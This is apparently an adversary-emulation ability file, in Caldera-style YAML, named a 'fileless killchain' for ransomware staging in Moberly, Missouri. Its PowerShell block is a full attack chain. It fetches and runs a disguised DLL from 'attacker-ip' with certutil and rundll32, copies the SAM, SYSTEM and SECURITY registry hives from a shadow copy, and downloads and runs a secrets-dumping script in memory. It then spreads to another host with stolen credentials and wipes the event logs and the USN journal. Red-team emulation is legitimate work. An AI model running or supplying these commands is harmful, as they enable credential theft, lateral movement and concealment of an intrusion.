
- id: moberly_fileless_chain
  name: Moberly Fileless Killchain
  description: Fileless ransomware staging via print service exposures in Moberly, Missouri.
  tactic: execution
  technique:
    attack_id: T1218.011
    name: Rundll32
  platforms:
    windows:
      psh:
        command: |
          certutil -urlcache -split -f "http://attacker-ip/nsfw.jpg" $env:TEMP\nsfw.jpg
          rundll32.exe $env:TEMP\nsfw.jpg,#1
          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM" "$env:TEMP\SAM"
          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM" "$env:TEMP\SYSTEM"
          Copy-Item "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY" "$env:TEMP\SECURITY"
          IEX (New-Object Net.WebClient).DownloadString("http://attacker-ip/secretsdump.ps1")
          Invoke-SecretsDump -System $env:TEMP\SYSTEM -Security $env:TEMP\SECURITY -Sam $env:TEMP\SAM
          Invoke-Command -ScriptBlock { rundll32.exe \\attacker\share\nsfw.dll,#1 } -ComputerName 192.168.X.X -Credential $cred
          wevtutil cl Security & wevtutil cl Application & fsutil usn deletejournal /D C:
